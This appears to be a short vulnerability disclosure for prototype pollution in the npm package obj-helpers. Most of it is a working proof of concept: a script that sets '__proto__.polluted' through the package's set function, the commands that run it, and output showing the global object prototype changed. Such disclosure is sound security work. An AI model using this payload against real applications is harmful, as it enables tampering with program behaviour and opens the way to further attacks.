# Description

Prototype Pollution in obj-helpers

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var objHelpers = require("obj-helpers")
var obj = {}
console.log("Before : " + {}.polluted);
objHelpers.set(obj,"__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i obj-helpers # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
